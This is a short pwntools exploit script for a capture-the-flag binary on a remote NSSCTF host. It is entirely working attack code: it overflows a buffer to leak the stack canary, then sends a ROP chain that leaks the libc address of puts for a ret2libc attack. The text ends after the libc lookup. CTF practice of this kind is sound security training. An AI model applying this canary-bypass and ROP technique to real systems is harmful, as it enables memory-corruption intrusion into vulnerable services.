from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=remote("node4.anna.nssctf.cn",25418)
elf=ELF('./pwn')

# cannary_get
canary_=b'a'*(0x50-8)
p.sendlineafter("overflow?",canary_)
p.recvline()
canary_=u64(p.recv(7).rjust(8,b'\x00'))
log.success(hex(canary_))

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
pop_rdi_ret=0x0000000000400863
main_addr=0x4006e2
ret_addr=0x000000000040059e

payload=flat([
    b'a'*(0x50-8),
    canary_,
    b'a'*8,
    pop_rdi_ret,
    puts_got,
    puts_plt,
    main_addr
]
)
p.sendlineafter("Try harder!",payload)
leak_puts=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success(hex(leak_puts))
libc=LibcSearcher('puts',leak_puts)
